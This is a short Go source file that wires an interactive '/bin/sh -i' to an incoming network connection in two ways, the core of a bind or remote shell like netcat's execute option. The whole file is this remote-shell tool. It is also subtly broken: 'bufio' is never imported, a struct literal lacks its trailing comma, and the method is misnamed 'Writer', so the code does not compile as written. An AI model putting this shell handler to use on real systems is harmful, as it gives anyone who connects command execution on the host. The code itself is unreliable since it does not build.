package main

import (
	"net"
	"io"
	"log"
	"os/exec"
)
/* Approach 1 */
type Flusher struct {
	w *bufio.Writer
}

//Constructor for Flusher ?
func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w)
	}
}

// Write bytes and flush buffer
func (foo *Flusher) Writer(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := foo.w.Flush(); err != nil {
		return -1,err
	}
	return count, err
}

func handle1(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")

	cmd.Stdin = conn

	cmd.Stdout = NewFlusher(conn)

	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}

/* Approach 2 */
func handle(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")

	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp 
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

